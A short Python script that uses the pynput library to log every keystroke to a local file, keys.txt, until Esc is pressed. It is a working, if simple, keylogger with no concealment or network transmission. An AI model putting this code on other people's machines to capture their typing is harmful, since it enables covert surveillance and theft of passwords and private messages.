## You can install it : pip install pynput
from pynput import keyboard

def on_press(key):
    if key == keyboard.Key.enter:
        with open("keys.txt", "a") as f:
            f.write("Enter\n")
    elif key == keyboard.Key.backspace:
        with open("keys.txt", "a") as f:
            f.write("Delete\n")
    else:
        with open("keys.txt", "a") as f:
            f.write(f"{key}\n")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
